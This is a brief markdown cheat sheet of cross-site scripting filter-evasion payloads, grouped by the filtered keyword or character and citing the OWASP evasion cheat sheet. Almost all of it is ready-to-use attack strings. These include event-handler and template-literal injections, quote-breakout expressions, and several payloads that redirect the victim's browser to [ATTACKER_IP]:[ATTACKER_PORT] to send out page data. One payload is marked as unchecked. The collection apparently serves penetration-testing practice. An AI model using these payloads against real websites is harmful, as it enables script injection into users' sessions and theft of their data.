#xss 

## Ressource
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html


## Filter `myWord`
```html
<script>alert(“mmyWordyWord”)</script>
```


## Filter `script`
```html
<img src=x onerror=alert(document.domain)>
```

```html
<a onclick=alert(document.domain)>Clickme</a>
```


## Filter `alert`
```html
<script>prompt(document.domain)</script>
```

```html
<script>confirm(document.domain)</script>
```


## Filter `http`
```html
<script>document.location=//[ATTACKER_IP]:[ATTACKER_PORT]/?c=document.domain</script>
```


## Filter `()`
```html
<script>alert`Hello`</script>
```

```html
<script>window.location=`http://[ATTACKER_IP]:[ATTACKER_PORT]?c=${document.domain}`</script>
```

```html
<!-- TO CHECK -->
<script>{id:document.location="http://[ATTACKER_IP]:[ATTACKER_PORT]/?c="+document.domain}</script>
```


## Filter `; < > + "`
```js
'-alert(document.domain)-'
```

```js
'==alert(document.domain)// 
```

```js
'^alert(document.domain)//
```



